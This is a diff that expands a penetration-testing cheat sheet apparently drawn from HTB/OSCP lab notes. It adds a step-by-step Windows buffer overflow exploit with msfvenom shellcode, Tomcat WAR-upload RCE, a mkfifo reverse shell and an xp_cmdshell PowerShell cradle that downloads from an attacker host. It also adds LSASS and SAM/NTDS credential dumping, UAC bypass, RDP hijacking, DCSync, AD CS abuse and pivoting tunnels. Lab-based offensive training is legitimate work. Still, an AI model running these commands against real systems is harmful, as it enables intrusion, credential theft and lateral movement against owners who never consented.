@@ -12,12 +12,13 @@ Extracted from all `notes.md` / `report.md` files under `boxes/htb/`, `boxes/pro
 2. Web Enumeration
 3. Web Exploitation (by vuln type)
 4. Initial Access / Exploits (CVE-specific)
-5. Reverse Shells / File Transfer
-6. Linux Privilege Escalation
-7. Windows Privilege Escalation
-8. Active Directory
-9. Password Cracking
-10. Post-Exploitation / Persistence / Pivoting
+5. Buffer Overflow (Windows)
+6. Reverse Shells / File Transfer
+7. Linux Privilege Escalation
+8. Windows Privilege Escalation
+9. Active Directory
+10. Password Cracking
+11. Post-Exploitation / Persistence / Pivoting
 
 ---
 
@@ -68,6 +69,12 @@ Full-port scan across a target list file with aggressive timing, followed by a t
 netexec smb 10.0.2.0/24
 ```
 Sweep an entire subnet for live SMB hosts — one shot reveals hostnames, OS build, domain, signing status, and null-auth support for every machine on the LAN. (ADChain_01)
+
+```sh
+nmap -sU --top-ports 100 <IP>
+nmap -sU -p 53,69,88,123,161,162,389,500 <IP>
+```
+UDP scan — easy to forget, catches SNMP/TFTP/Kerberos/NTP/DNS services TCP scans miss. Slow, so scope to top-ports or a specific list rather than `-p-`.
 
 ```sh
 dig @<IP> <domain>
@@ -197,6 +204,18 @@ Alternate directory brute forcer — found `/login`, `/register`, `/web.config` 
 nikto -h <target>
 ```
 Web server vuln scanner. (MonitorsFour, ClamAV)
+
+```sh
+wpscan --url http://<target> --enumerate u,vp,vt --api-token <token>
+wpscan --url http://<target> -e ap --plugins-detection aggressive
+wp-cli --path=<path> user list --allow-root
+```
+WordPress-specific enum — usernames, vulnerable plugins/themes (needs a free WPVulnDB/WPScan API token for CVE data).
+
+```sh
+droopescan scan drupal -u http://<target>
+```
+Drupal-specific version/module scanner (Drupalgeddon-style CVEs are common OSCP-lab targets).
 
 ```sh
 whatweb <target>
@@ -498,9 +517,74 @@ curl "http://<target>/image.php?img=http://<attacker_ip>/shell.php"
 ```
 (Snookums)
 
+```sh
+# Apache Tomcat Manager — authenticated WAR upload RCE
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
+curl -u '<user>:<pass>' -T shell.war "http://<target>:8080/manager/text/deploy?path=/shell"
+curl "http://<target>:8080/shell/"
+```
+Classic Tomcat manager RCE once default/weak `manager-gui`/`manager-script` creds are found (often `tomcat:s3cret`, `admin:admin`, or from `tomcat-users.xml` on an LFI). `manager/text/deploy` is the non-interactive API path.
+
 ---
 
-## 5. Reverse Shells / File Transfer
+## 5. Buffer Overflow (Windows)
+
+Standard OSCP-style stack-overflow methodology against a 32-bit Windows binary/service, using Immunity Debugger + `mona.py` on the Windows attack VM.
+
+```python
+#!/usr/bin/env python3
+import socket
+ip, port = "<target>", <port>
+buffer = b"A" * 100  # increase until crash to find approx offset
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+s.send(buffer)
+s.close()
+```
+Fuzzing skeleton — send an increasing cyclic pattern (or `A`*N loop) until the service crashes; note the crash size range.
+
+```
+!mona config -set workingfolder C:\mona\%p
+!mona pc 3000                     # pattern_create
+!mona pattern_offset EIP <value>  # confirm exact offset once EIP shows the pattern
+```
+Mona generates a 3000-byte non-repeating pattern; after the crash, feed the EIP value back to mona to get the exact offset.
+
+```python
+buffer = b"A" * <offset> + b"B" * 4 + b"C" * (total_len - offset - 4)
+```
+Confirm offset control: EIP should read exactly `42424242` (`BBBB`).
+
+```
+!mona bytearray -b "\x00"
+!mona compare -f C:\mona\<proc>\bytearray.bin -a <ESP_address_after_sending_full_bytearray>
+```
+Generate a full `\x00`-excluded badchar array, send it in the buffer, then diff the stack dump against the clean array to find which bytes get mangled — repeat, adding each new badchar to `-b`, until the comparison is clean.
+
+```
+!mona jmp -r esp -cpb "\x00\x0a\x0d<other badchars>"
+```
+Find a `JMP ESP` (or equivalent) address in a non-ASLR/non-SafeSEH module, excluding badchars — this becomes the return address (little-endian) that redirects execution into the buffer.
+
+```python
+buffer  = b"A" * <offset>
+buffer += b"\xAF\x11\x50\x62"          # JMP ESP addr, little-endian, from mona
+buffer += b"\x90" * 16                 # NOP sled
+buffer += shellcode                    # msfvenom -b badchars payload below
+```
+```sh
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python -b '\x00\x0a\x0d' EXITFUNC=thread
+```
+Final exploit assembly: offset padding → return address → NOP sled → bad-char-free shellcode. `EXITFUNC=thread` avoids crashing the whole process on shell exit.
+
+```
+!mona modules
+```
+Lists loaded modules with their ASLR/SafeSEH/rebase status — use to pick a module safe to search for `JMP ESP` in.
+
+---
+
+## 6. Reverse Shells / File Transfer
 
 ```sh
 nc -nvlp <port>
@@ -577,6 +661,21 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 Upgrade a dumb reverse shell to a semi-interactive TTY. (bullyBox, QuackerJack, Exghost)
 
 ```sh
+# after pty.spawn:
+export TERM=xterm
+^Z                                        # background the shell
+stty raw -echo; fg                        # on attacker terminal, then foreground
+# once back in the shell, press Enter, then:
+stty rows <N> columns <N>                 # match `stty size` from attacker term
+```
+Full TTY upgrade — `stty raw -echo` gives proper line editing/ctrl-c/tab-complete/vim support, `stty rows/columns` fixes screen redraw for full-screen tools. Get `<N>` values from `stty size` in a second attacker terminal.
+
+```sh
+rlwrap nc -lvnp <port>
+```
+Alternative to the pty/stty dance — `rlwrap` on the listener alone gives arrow-key history without touching the victim shell at all.
+
+```sh
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> > /tmp/f
 ```
 Named-pipe (`mkfifo`) reverse shell — useful when injecting through a size-limited or quote-mangling parameter (e.g. into a PHP file via cron overwrite). (LaVita)
@@ -588,7 +687,7 @@ Alternative recursive SMB download tool (noted as not working reliably vs. `smbc
 
 ---
 
-## 6. Linux Privilege Escalation
+## 7. Linux Privilege Escalation
 
 ```sh
 find / -perm -4000 -type f 2>/dev/null
@@ -691,7 +790,7 @@ See section 4 for full details. (Exghost, Snookums)
 
 ---
 
-## 7. Windows Privilege Escalation
+## 8. Windows Privilege Escalation
 
 ```powershell
 whoami /priv
@@ -779,9 +878,68 @@ wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
 ```
 See CLSID note above — `SeImpersonatePrivilege` abuse tool set for older Windows.
 
+```powershell
+whoami /priv
+```
+Check for `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeImpersonatePrivilege` — each has a distinct escalation path below.
+
+```sh
+# SeDebugPrivilege — dump LSASS, extract creds offline
+procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+# or, with mimikatz already on target:
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+```
+```sh
+# offline parse of a procdump'd lsass.dmp on Kali (no need to run mimikatz on target)
+pypykatz lsa minidump lsass.dmp
+```
+`SeDebugPrivilege` lets you attach to any process — dump LSASS with procdump (avoids AV flagging mimikatz itself) then parse the minidump offline with pypykatz for cleartext creds/NT hashes.
+
+```powershell
+# SeBackupPrivilege / SeRestorePrivilege — read any file bypassing ACLs
+reg save hklm\sam C:\temp\sam
+reg save hklm\system C:\temp\system
+reg save hklm\security C:\temp\security
+robocopy /b C:\Windows\NTDS C:\temp\ntds NTDS.dit    # on a DC, if SeBackupPrivilege holds
+```
+```sh
+impacket-secretsdump -sam sam -system system -security security LOCAL
+```
+`SeBackup`/`SeRestore` bypass file ACLs entirely — dump SAM/SYSTEM/SECURITY (or NTDS.dit on a DC) even as a low-priv account that holds the privilege, then parse offline.
+
+```powershell
+# SeTakeOwnershipPrivilege — seize ownership of a protected file/service binary
+takeown /f C:\Windows\System32\utilman.exe
+icacls C:\Windows\System32\utilman.exe /grant <user>:F
+copy cmd.exe utilman.exe
+# lock screen, click Ease of Access -> SYSTEM cmd.exe pops
+```
+Take ownership of a SYSTEM-run binary you couldn't otherwise touch, replace it, trigger it (classic sticky-keys/utilman swap works pre-login on RDP/console).
+
+```cmd
+# UAC bypass — fodhelper (no admin prompt, works when integrity is medium but user is local admin)
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\path\shell.exe" /f
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f
+fodhelper.exe
+```
+Registry-hijack UAC autoElevate for `fodhelper.exe` to run a payload at High integrity without a prompt — only useful when current user is already in local Administrators but running medium-integrity.
+
+```cmd
+# RDP session hijack (SYSTEM required to run tscon without a password)
+query user
+tscon <session_id> /dest:<current_session_name>
+```
+Hijack another logged-on user's RDP session with no password if you already have SYSTEM (e.g. via PsExec/potato) — instantly takes over their desktop session.
+
+```sh
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+```
+See main GodPotato entry above — the general first-choice tool whenever `SeImpersonatePrivilege` shows in `whoami /priv`.
+
 ---
 
-## 8. Active Directory
+## 9. Active Directory
 
 ### Enumeration
 ```sh
@@ -863,6 +1021,15 @@ python targetedKerberoast.py -v -d '<domain>' -u '<user>' -p '<pass>' --dc-ip <d
 ```
 Kerberoast a specific target account you have `GenericWrite` on (sets a fake SPN temporarily), instead of every SPN account in the domain. (Hokkaido)
 
+```powershell
+Rubeus.exe kerberoast /outfile:hashes.txt
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+Rubeus.exe tgtdeleg
+Rubeus.exe ptt /ticket:<base64_ticket>
+Rubeus.exe renew /ticket:<base64_ticket>
+```
+On-host C# equivalent of GetUserSPNs/GetNPUsers when running from an already-compromised Windows box — `ptt` (pass-the-ticket) injects a TGT/TGS straight into the current logon session for immediate use.
+
 ```sh
 hashcat -O -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --show
 ```
@@ -896,6 +1063,11 @@ netexec rdp ips -u users -p pass --continue-on-success
 netexec winrm ips -u users -p pass --continue-on-success
 ```
 Spray a username list against a password list across every live host (`ips`), for SMB/RDP/WinRM in turn; `--continue-on-success` keeps testing remaining user/host combos instead of stopping at the first hit. WinRM hits are the most valuable — they mean an interactive shell. (ADChain_01)
+
+```sh
+netexec smb <dc_ip> -u users.txt -p '<single_password>' --continue-on-success
+```
+**Lockout-safe spray**: one password against ALL users, not one user against many passwords — check domain lockout threshold first (`net accounts /domain` or bloodhound `Domain` node) and always leave a wide margin (e.g. only 1 attempt per 30 min if threshold is 5) to avoid locking out every account in the domain.
 
 ### Credential Dumping — SAM / LSA / NTDS via NetExec
 ```powershell
@@ -967,6 +1139,38 @@ impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc-ntlm
 DCSync dump of NTLM hashes once an account has `Replicating Directory Changes` rights. (Forest, Hokkaido — attempted)
 
 ```sh
+impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc
+```
+Full DCSync — NTLM hashes AND Kerberos keys AND cleartext-reversible creds for every domain principal, dumped straight over the wire (no reg save/local copy needed). The go-to once any account has `Replicating Directory Changes`+`Replicating Directory Changes All`.
+
+```
+mimikatz # lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt
+```
+Same DCSync attack run locally from mimikatz on a compromised domain-joined host instead of impacket from Kali — useful when only interactive access exists (e.g. `krbtgt` hash grab for a Golden Ticket).
+
+```sh
+# Constrained/unconstrained delegation abuse
+impacket-getST -spn <target_spn> -impersonate administrator '<domain>/<delegation_account>:<pass>'
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass <domain>/administrator@<target_host>
+```
+If a service account has `TRUSTED_TO_AUTH_FOR_DELEGATION` (constrained delegation) to a target SPN, request a service ticket impersonating Administrator (S4U2Self/S4U2Proxy) and use it directly — no password/hash for Administrator needed.
+
+```sh
+# AD CS (Active Directory Certificate Services) misconfig — ESC1/ESC8
+pip install certipy-ad
+certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <dc_ip> -vulnerable
+certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA_name>' -target <dc_ip> -template '<vulnerable_template>' -upn administrator@<domain>
+certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
+```
+ESC1 — enroll a cert as any user (including Administrator) via a misconfigured template that allows client-supplied SAN + client auth EKU; `certipy auth` exchanges the resulting cert for the account's NTLM hash/TGT. Enumerate first — AD CS misconfigs are one of the most common modern AD privesc paths.
+
+```sh
+certipy relay -target 'http://<ca_host>/certsrv/certfnsh.asp' -template DomainController
+```
+ESC8 — NTLM relay to the AD CS web enrollment endpoint (HTTP, unsigned) to get a machine/DC certificate from a coerced authentication (e.g. via PetitPotam/PrinterBug).
+
+```sh
 rpcclient -U '<user>%<pass>' <dc_ip>
 setuserinfo2 <TARGET_USER> 24 '<newpass>'
 ```
@@ -998,6 +1202,14 @@ SELECT * FROM <db>.INFORMATION_SCHEMA.TABLES;
 ```
 Enumerate MSSQL role membership and impersonation rights, then use `EXECUTE AS LOGIN` to pivot to a more privileged SQL login and read tables containing plaintext creds. (Hokkaido)
 
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker_ip>/shell.ps1'')"';
+```
+Once `sysadmin`, enable and abuse `xp_cmdshell` for direct OS command execution — the standard MSSQL-to-RCE path (runs as the SQL Server service account, often `NT SERVICE\MSSQLSERVER` or a domain service account with further AD rights).
+
 ### RDP
 ```sh
 xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:'<user>' /p:'<pass>' /v:<host>
@@ -1007,7 +1219,7 @@ RDP client one-liners once you have valid domain/local creds. (Hokkaido, Nickel,
 
 ---
 
-## 9. Password Cracking
+## 10. Password Cracking
 
 ```sh
 sudo gunzip /usr/share/wordlists/rockyou.txt.gz
@@ -1073,13 +1285,69 @@ Decode base64-encoded credentials found in leaked config/process listings (e.g. 
 
 ---
 
-## 10. Post-Exploitation / Persistence / Pivoting
+## 11. Post-Exploitation / Persistence / Pivoting
 
 ```sh
 ssh -L <local_port>:127.0.0.1:<remote_port> <user>@<host>
 vncviewer -passwd ./secret localhost:<local_port>
 ```
 SSH local port-forward to reach a service (VNC) only bound to the victim's loopback interface; a stolen binary VNC "secret" file can be passed directly to `vncviewer -passwd`. (Poison)
+
+```sh
+ssh -D 1080 <user>@<host>
+```
+SSH dynamic (SOCKS) proxy — pair with `proxychains` below to route arbitrary tools through a pivot box, instead of setting up one static `-L` forward per port.
+
+```sh
+sudo sshuttle -r <user>@<pivot_host> 10.10.10.0/24
+```
+Transparent VPN-like pivot over SSH — routes an entire subnet through the compromised host with no per-port forwarding and no proxychains wrapping needed; simplest option when SSH is available on the pivot.
+
+```sh
+# chisel — attacker (Kali) runs the server, victim runs the client
+./chisel server -p 8000 --reverse
+# on victim:
+chisel.exe client <attacker_ip>:8000 R:socks
+```
+Reverse SOCKS pivot through a victim with no inbound firewall exceptions needed — victim dials out to Kali, Kali gets a SOCKS5 proxy into the victim's internal network. `R:<local_port>:<remote_host>:<remote_port>` for a specific reverse port forward instead of full SOCKS.
+
+```sh
+# ligolo-ng — attacker runs proxy, victim runs agent
+./proxy -selfcert
+# on victim:
+agent.exe -connect <attacker_ip>:11601 -ignore-cert
+# in proxy console:
+session
+start
+ip route add 10.10.10.0/24 dev ligolo
+```
+Modern tun-interface pivot (faster/more stable than chisel for full subnet routing) — creates a real network interface on Kali so any tool (nmap, etc.) works natively against the pivoted subnet, no proxychains needed.
+
+```sh
+socat TCP-LISTEN:<local_port>,fork TCP:<internal_target>:<internal_port>
+```
+Simple relay when netcat/ssh forwarding isn't available — run on a pivot box to bridge attacker traffic to an internal-only host/port.
+
+```
+# /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+```
+```sh
+proxychains nmap -sT -Pn <internal_target>
+proxychains impacket-psexec <domain>/<user>:<pass>@<internal_target>
+```
+Route any TCP tool through an established SOCKS proxy (SSH `-D`, chisel, etc.) — remember `-sT`/`-Pn` for nmap since proxychains can't do raw SYN scans.
+
+```cmd
+netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=0.0.0.0 connectport=<remote_port> connectaddress=<internal_target>
+netsh interface portproxy show all
+```
+Windows-native port forward — pivot through a compromised Windows box without dropping any extra tooling on disk.
+
+```sh
+plink.exe -ssh -R <remote_port>:127.0.0.1:<local_port> <user>@<attacker_ip> -pw <pass>
+```
+Windows-side SSH reverse tunnel using PuTTY's `plink` when no other pivot tooling can be uploaded — dials out from Windows to an SSH server on the attacker box.
 
 ```sh
 curl http://<docker_api_host>:2375/version
